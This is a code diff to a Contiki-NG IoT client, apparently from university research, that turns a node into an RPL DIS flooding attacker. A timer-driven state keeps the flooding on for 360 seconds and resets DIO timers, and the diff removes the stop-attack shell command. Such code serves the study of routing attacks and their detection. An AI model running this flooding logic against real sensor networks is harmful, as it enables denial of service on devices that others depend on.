@@ -32,6 +32,8 @@
 
 /* Implementation by Yonsei */
 #define data_size 17
+char dis_attack_state = 0;
+static struct etimer attack_timer;
 bool flooding_attack_send_dis = false;
 /* __Implementation by Yonsei */
 
@@ -74,29 +76,15 @@ udp_rx_callback(struct simple_udp_connection *c,
 static
 PT_THREAD(cmd_dis_repeat_attack(struct pt *pt, shell_output_func output, char *args))
 {
+
   PT_BEGIN(pt);
-  LOG_INFO("FLOODING ATTACK IS STARTED!\n");
-  SHELL_OUTPUT(output, "FLOODING ATTACK IS STARTED!\n");
-  flooding_attack_send_dis = true; // Used for sending dis packet even after joining the DODAG
-  rpl_timers_dio_reset("FLOODING ATTACK IS STARTED!");
+  dis_attack_state = 1;
   PT_END(pt);
 }
 
-static
-PT_THREAD(cmd_stop_attack(struct pt *pt, shell_output_func output, char *args))
-{
-  PT_BEGIN(pt);
-  LOG_INFO("FLOODING ATTACK IS FINISHED!\n");
-  SHELL_OUTPUT(output, "FLOODING ATTACK IS FINISHED!\n");
-  flooding_attack_drop_dio = false;
-  flooding_attack_send_dis = false;
-  rpl_timers_dio_reset("FLOODING ATTACK IS FINISHED!");
-  PT_END(pt);
-}
 /*---------------------------------------------------------------------------*/
 static const struct shell_command_t client_commands[] = {
   { "dis-repeat-attack", cmd_dis_repeat_attack, "'> attack': Sets the node in dis-repeat attack mode." },
-  { "stop-attack", cmd_stop_attack, "'> attack': Sets the node in non-attack mode." },
   { NULL, NULL, NULL },
 };
 /* __Implementation by Yonsei */
@@ -147,22 +135,6 @@ PROCESS_THREAD(udp_client_process, ev, data)
     default_instance = rpl_get_default_instance();
     rank = default_instance ? default_instance->dag.rank : RPL_INFINITE_RANK;
     dag_version = default_instance ? default_instance->dag.version : 0;
-    // LOG_INFO("DATA: sq:%"PRIu32",rank:%3u,ver:%u",
-    //           count, rank, dag_version);
-    // LOG_INFO_(",dis-ur:%"PRIu32",dis-mr:%"PRIu32,
-    //           icmp6_stats.dis_uc_recv, icmp6_stats.dis_mc_recv);
-    // LOG_INFO_(",dis-us:%"PRIu32",dis-ms:%"PRIu32,
-    //           icmp6_stats.dis_uc_sent, icmp6_stats.dis_mc_sent);
-    // LOG_INFO_(",dio-ur:%"PRIu32",dio-mr:%"PRIu32,
-    //           icmp6_stats.dio_uc_recv, icmp6_stats.dio_mc_recv);
-    // LOG_INFO_(",dio-us:%"PRIu32",dio-ms:%"PRIu32,
-    //           icmp6_stats.dio_uc_sent, icmp6_stats.dio_mc_sent);
-    // LOG_INFO_(",dao-r:%"PRIu32",dao-s:%"PRIu32,
-    //           icmp6_stats.dao_recv, icmp6_stats.dao_sent);
-    // LOG_INFO_(",daoa-r:%"PRIu32",daoa-s:%"PRIu32,
-    //           icmp6_stats.dao_ack_recv, icmp6_stats.dao_ack_sent);
-    // LOG_INFO_(",dio_intcurrent:%"PRIu32, (uint32_t)curr_instance.dag.dio_intcurrent);
-    // LOG_INFO_(",dio_counter:%"PRIu32"\n", (uint32_t)curr_instance.dag.lifetime);
 
     /* Implementation by Yonsei */
     data_arr[0]  = (uint32_t) count;
@@ -207,6 +179,23 @@ PROCESS_THREAD(udp_client_process, ev, data)
       count++;
 
       /* Implementation by Yonsei */
+
+      LOG_INFO("dis_attack_state: %d\n", dis_attack_state);
+      if (dis_attack_state == 1){
+        etimer_set(&attack_timer, 360 * CLOCK_SECOND);
+        dis_attack_state = 2;
+        LOG_INFO("FLOODING ATTACK IS STARTED!\n");
+        flooding_attack_send_dis = true; // Used for sending dis packet even after joining the DODAG
+        rpl_timers_dio_reset("FLOODING ATTACK IS STARTED!");
+        etimer_set(&attack_timer, 360 * CLOCK_SECOND);
+      } else if (dis_attack_state == 2 && etimer_expired(&attack_timer)){
+        dis_attack_state = 1;
+        LOG_INFO("FLOODING ATTACK IS FINISHED!\n");
+        flooding_attack_send_dis = false;
+        rpl_timers_dio_reset("FLOODING ATTACK IS FINISHED!");
+      }
+
+
       // Naive dis-send right after a udp packet send
       if(flooding_attack_send_dis){
         rpl_icmp6_dis_output(NULL);
